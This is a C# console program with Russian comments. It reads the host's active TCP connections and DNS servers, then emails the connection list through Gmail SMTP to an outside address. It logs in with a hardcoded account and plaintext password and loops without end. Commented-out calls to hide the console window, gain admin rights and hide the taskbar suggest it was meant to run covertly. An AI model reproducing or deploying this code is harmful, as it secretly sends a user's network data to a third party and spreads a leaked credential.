using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading.Tasks;

namespace TCP_
{
    class Program
    {
        string getAllData;



        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        const int SW_HIDE = 0;
        const int SW_SHOW = 5;

      

        static void Main(string[] args)
        {
         //var handle = GetConsoleWindow();
        //ShowWindow(handle, SW_HIDE);
        //AdminPriv.AdminRun();
        // HideTaskBar.Show(); // Show hide taskbar
            int i = 0;
            
            if (i == 998) { Environment.Exit(0); }
            else
            {
                while (i < 999)
                {
                    GetTCPInformation();
                }
            }
            Console.Read();
        }

        public void DNSinfo()
        {
            //Console.WriteLine("======================================================================");
            //Console.WriteLine("========        ======    ====   ===           =======================");
            //Console.WriteLine("======== ======= =====   = ===   ===  ================================");
            //Console.WriteLine("======== ======= =====   == ==   =====         =======================");
            //Console.WriteLine("======== ======= =====   === =   ===========   =======================");
            //Console.WriteLine("========        ======   ====    ====          =======================");
            //Console.WriteLine("======================================================================");

            NetworkInterface[] adapters = NetworkInterface.GetAllNetworkInterfaces();
            foreach (NetworkInterface adapter in adapters)
            {
                IPInterfaceProperties adapterProperties = adapter.GetIPProperties();
                IPAddressCollection dnsServers = adapterProperties.DnsAddresses;
                if (dnsServers.Count > 0)
                {
                    Console.WriteLine(adapter.Description);
                    foreach (IPAddress dns in dnsServers)
                    {
                        Console.WriteLine("  DNS Servers ............................. : {0}",
                        dns.ToString());
                    }
                    Console.WriteLine();
                }
            }
        }

        public static void GetTCPInformation()
        {
            IPGlobalProperties IPGproperties = IPGlobalProperties.GetIPGlobalProperties();
            TcpConnectionInformation[] connections = IPGproperties.GetActiveTcpConnections();
            //Console.WriteLine("############################################################");
            //Console.WriteLine("####        ######        #######         ##################");
            //Console.WriteLine("#######  #########  #############  #####  ##################");
            //Console.WriteLine("#######  #########  #############         ##################");
            //Console.WriteLine("#######  #########  #############  #########################");
            //Console.WriteLine("#######  #########        #######  #########################");
            //Console.WriteLine("############################################################");


            List<string> listString = new List<string>();
            // отправитель - устанавливаем адрес и отображаемое в письме имя
            MailAddress from = new MailAddress("metamaxteam@gmail.com", "M");
            // кому отправляем
            MailAddress to = new MailAddress("zerotool1212@gmail.com");
            // создаем объект сообщения
            MailMessage m = new MailMessage(from, to);
            // тема письма
            m.Subject = "Тест";
            // текст письма
           
            

            foreach (TcpConnectionInformation tcp in connections)
            {
             
                m.Body += "<br>" + "Local:" + tcp.LocalEndPoint.Address.ToString() + "|" + "Remote:" + tcp.RemoteEndPoint.Address.ToString() + "|" + "Port:" + tcp.RemoteEndPoint.Port.ToString() + "|" + "State:" + tcp.State.ToString();
                Console.WriteLine("Local:" + tcp.LocalEndPoint.Address.ToString() + "|" + "Remote:" + tcp.RemoteEndPoint.Address.ToString() + "|" + "Port:" + tcp.RemoteEndPoint.Port.ToString() + "|" + "State:" + tcp.State.ToString());
                Console.WriteLine("======================================================================");
            }

            // письмо представляет код html
            m.IsBodyHtml = true;
            // адрес smtp-сервера и порт, с которого будем отправлять письмо
            SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587);
            // логин и пароль
            smtp.Credentials = new NetworkCredential("fdeath6660@gmail.com", "hooklok90");
            smtp.EnableSsl = true;
            smtp.Send(m);
            smtp.SendCompleted += Smtp_SendCompleted;
        }

        private static void Smtp_SendCompleted(object sender, AsyncCompletedEventArgs e)
        {
            Console.WriteLine("Success!");
        }
    }

   
}
